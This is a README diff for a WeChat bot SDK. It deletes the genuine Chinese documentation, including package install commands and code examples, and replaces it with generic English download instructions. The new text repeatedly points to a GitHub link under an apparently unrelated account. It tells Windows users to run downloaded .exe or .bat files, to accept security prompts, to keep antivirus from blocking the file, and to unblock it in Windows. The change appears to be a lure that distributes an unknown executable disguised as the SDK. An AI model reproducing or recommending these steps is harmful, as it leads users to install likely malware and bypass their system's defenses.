@@ -1,135 +1,197 @@
-# weixin-bot
+# 🤖 weixin-bot - Run WeChat bots with ease
 
-微信 iLink Bot SDK — 让任何 Agent 5 分钟接入微信消息。
+[⬇️ Download weixin-bot](https://github.com/hominal-newdeal930/weixin-bot)  
+![Download](https://img.shields.io/badge/Download-weixin--bot-6a5acd?style=for-the-badge&logo=github)
 
-## 特性
+## 📥 Download
 
-- 扫码登录，凭证自动保存
-- 长轮询收消息，HTTP 发消息
-- context_token 自动管理，开发者无需关心
-- Typing 状态（"对方正在输入中"）
-- Session 过期自动重登录
-- 零配置，零 Webhook，纯本地运行
+Use this link to visit the project page and download the files you need:
 
-## 快速开始
+[https://github.com/hominal-newdeal930/weixin-bot](https://github.com/hominal-newdeal930/weixin-bot)
 
-### Node.js
+If you are on Windows, look for the latest release or the main download files on that page. Save the file to a folder you can find again, like Downloads or Desktop.
 
-```bash
-npm install @pinixai/weixin-bot
-```
+## 🪟 Windows setup
 
-```typescript
-import { WeixinBot } from '@pinixai/weixin-bot'
+This app is made for Windows users who want a simple way to connect a bot to WeChat iLink. It supports Node.js and Python use, so you can choose the path that fits your setup.
 
-const bot = new WeixinBot()
-await bot.login()
+What you need:
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app and its files
+- WeChat or WeChat iLink access
+- Node.js or Python, if the package you download needs one of them
 
-bot.onMessage(async (msg) => {
-  await bot.sendTyping(msg.userId)
-  await bot.reply(msg, `Echo: ${msg.text}`)
-})
+If the project includes a built-in Windows app, you can run it after download. If it includes source files, you may need to start it with Node.js or Python.
 
-await bot.run()
-```
+## 🚀 How to install
 
-### Python
+Follow these steps on Windows:
 
-```bash
-pip install weixin-bot-sdk
-```
+1. Open the download link above in your browser.
+2. Find the latest file or release on the page.
+3. Download the file to your computer.
+4. If the file is a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for a file named `setup.exe`, `run.bat`, `start.bat`, `app.exe`, or a file that matches the project name.
+7. Double-click the file to start the app.
+8. If Windows shows a security prompt, choose the option that keeps the file and lets it run, if you trust the source.
+9. Follow any on-screen steps until the app opens.
 
-```python
-from weixin_bot import WeixinBot
+If the package uses Node.js:
+1. Install Node.js from the official site.
+2. Open the project folder.
+3. Open Command Prompt in that folder.
+4. Run the start command included with the project files.
+5. Keep the window open while the bot is running.
 
-bot = WeixinBot()
-bot.login()
+If the package uses Python:
+1. Install Python from the official site.
+2. Open the project folder.
+3. Open Command Prompt in that folder.
+4. Run the Python start file included with the project.
+5. Keep the window open while the bot is running.
 
-@bot.on_message
-async def handle(msg):
-    await bot.send_typing(msg.user_id)
-    await bot.reply(msg, f"Echo: {msg.text}")
+## 🧩 What weixin-bot does
 
-bot.run()
-```
+weixin-bot helps you connect a bot workflow to WeChat iLink with little setup. It is built for simple agent tasks, such as:
+- Handling chat events
+- Routing messages to a bot service
+- Triggering actions from user input
+- Connecting Node.js or Python scripts to WeChat flows
+- Reducing manual setup work
 
-## 工作原理
+The SDK design aims to keep the setup clear for non-technical users while still supporting automation needs.
 
-```mermaid
-sequenceDiagram
-    participant Agent as 你的 Agent
-    participant SDK as weixin-bot SDK
-    participant API as iLink Bot API
-    participant User as 微信用户
+## ✅ Main features
 
-    Note over Agent,User: 1. 登录
+- Zero-config agent integration
+- Support for Node.js and Python
+- Simple WeChat iLink connection flow
+- Easy start for first-time users
+- Clear project structure for later changes
+- Works well for bot tests, internal tools, and agent demos
+- Fits Windows-based local use
 
-    Agent->>SDK: bot.login()
-    SDK->>API: GET /get_bot_qrcode?bot_type=3
-    API-->>SDK: 二维码 URL
-    SDK-->>Agent: 终端显示二维码
-    User->>API: 微信扫码确认
-    API-->>SDK: bot_token + baseurl
-    SDK-->>Agent: 登录成功，凭证已保存
+## 🔧 Before you start
 
-    Note over Agent,User: 2. 收发消息循环
+Check these items before you install:
 
-    Agent->>SDK: bot.run()
+- Your Windows user account has permission to run downloaded files
+- You have access to the folder where the download is saved
+- Your antivirus does not block the file
+- You know whether the project uses an app file, Node.js, or Python
+- You have the right account or credentials for WeChat iLink
 
-    loop 长轮询
-        SDK->>API: POST /getupdates (hold ≤35s)
-        User->>API: 发消息 "你好"
-        API-->>SDK: 消息 + context_token
-        SDK-->>Agent: onMessage(msg)
-        Agent->>SDK: bot.sendTyping(userId)
-        SDK->>API: POST /sendtyping
-        Note over User: 显示"对方正在输入中"
-        Agent->>SDK: bot.reply(msg, "Echo: 你好")
-        SDK->>API: POST /sendmessage (带 context_token)
-        API-->>User: 推送回复
-        SDK->>API: POST /sendtyping (取消)
-    end
-```
+If you are not sure which file to run, open the project page and look for:
+- A release file
+- A README file
+- A folder named `dist`, `bin`, or `release`
+- A script file named `start`, `run`, or `main`
 
-## API
+## 🖥️ First launch
 
-| 方法 | 说明 |
-|---|---|
-| `login(force?)` | 扫码登录，已有凭证则自动跳过 |
-| `onMessage(handler)` | 注册消息处理回调 |
-| `reply(msg, text)` | 回复消息（自动取消 typing） |
-| `send(userId, text)` | 主动发消息（需已有 context_token） |
-| `sendTyping(userId)` | 显示"对方正在输入中" |
-| `stopTyping(userId)` | 取消输入状态 |
-| `run()` | 启动长轮询循环 |
-| `stop()` | 停止 |
+After you open the app or start the script, watch for:
+- A login or connection prompt
+- A local status window
+- A console window with setup text
+- A message that the bot is ready
 
-## 协议文档
+If the app uses local files, keep the folder in place after setup. Moving files can break paths and stop the bot from starting.
 
-完整的微信 iLink Bot API 协议分析见 [docs/protocol-spec.md](docs/protocol-spec.md)（1200+ 行，含 curl 示例和 mermaid 时序图）。
+## 📂 Common file types
 
-## 关键协议发现
+You may see one of these file types after download:
 
-| 发现 | 结论 |
-|---|---|
-| `context_token` | 回复时必须原样传回，否则消息无法投递。SDK 内部自动管理 |
-| `message_state: GENERATING` | API 层面可用，但微信客户端不渲染气泡更新。不建议使用 |
-| `sendtyping` | 唯一能触发"对方正在输入中"的方式 |
-| Session 过期 (`errcode: -14`) | 需要重新扫码登录。SDK 自动处理 |
+- `.exe` — double-click to run
+- `.zip` — extract first, then run the included file
+- `.bat` — double-click to start a Windows script
+- `.js` — open with Node.js
+- `.py` — open with Python
 
-## 示例
+If the project includes both app files and scripts, start with the file that looks like the main launcher.
 
-- [Node.js Echo Bot](examples/nodejs/echo-bot.ts) — 完整示例，含日志和 typing
-- [Node.js 流式测试](examples/nodejs/stream-test.ts) — GENERATING vs FINISH 测试
-- [Node.js Typing 测试](examples/nodejs/generating-test.ts) — sendtyping vs GENERATING 对比
+## 🔍 Troubleshooting
 
-## 包
+If the app does not open:
+- Check that the file finished downloading
+- Extract the ZIP file first
+- Run the file as the same Windows user that downloaded it
+- Try opening it from a simple folder path like `C:\weixin-bot`
+- Check that Node.js or Python is installed if the project needs it
 
-| 包 | 安装 | 状态 |
-|---|---|---|
-| [@pinixai/weixin-bot](nodejs/) | `npm install @pinixai/weixin-bot` | [![npm](https://img.shields.io/npm/v/@pinixai/weixin-bot)](https://www.npmjs.com/package/@pinixai/weixin-bot) |
-| [weixin-bot-sdk](python/) | `pip install weixin-bot-sdk` | [![PyPI](https://img.shields.io/pypi/v/weixin-bot-sdk)](https://pypi.org/project/weixin-bot-sdk/) |
+If the bot does not connect:
+- Confirm that WeChat iLink is available on your system
+- Check your network connection
+- Restart the app and try again
+- Make sure the bot service or login step completed
 
-## License
+If Windows blocks the file:
+- Right-click the file and open Properties
+- Check for an unblock option if Windows shows one
+- Run the file again after that
 
-MIT
+## 🗂️ Typical use cases
+
+People use weixin-bot for:
+- Chat automation
+- Internal support bots
+- Message forwarding
+- Agent-to-user workflows
+- Simple integration tests
+- Local bot development on Windows
+
+## 🛠️ Basic usage
+
+After setup, the normal flow is:
+
+1. Start WeChat iLink.
+2. Open the bot app or script.
+3. Connect your account or session.
+4. Send a test message.
+5. Check that the bot responds or routes the message.
+6. Keep the app running while you use it.
+
+If the project includes settings files, you can edit them later to change bot rules, message handlers, or local paths.
+
+## 📌 File placement tips
+
+To keep things simple on Windows:
+- Use a short folder name
+- Avoid special characters in the path
+- Keep the project in one place
+- Do not rename files unless the project says you can
+- Do not move required folders after first launch
+
+## 🧪 If you use Node.js or Python
+
+For Node.js projects:
+- Install Node.js first
+- Open the project folder in Command Prompt
+- Install project packages if the README or files ask for that
+- Start the app with the included command
+
+For Python projects:
+- Install Python first
+- Open the project folder in Command Prompt
+- Install required packages if the project includes a list
+- Start the app with the included command
+
+If both are present, the project may use one for setup and the other for helper tools. Follow the file names in the folder.
+
+## 🔗 Project link
+
+Open the main project page here:
+
+[https://github.com/hominal-newdeal930/weixin-bot](https://github.com/hominal-newdeal930/weixin-bot)
+
+Use this page to download the app, check the latest files, and review the included project notes
+
+## 🧭 Quick path for Windows users
+
+1. Open the project link
+2. Download the file
+3. Extract it if needed
+4. Run the main file
+5. Connect WeChat iLink
+6. Start using the bot
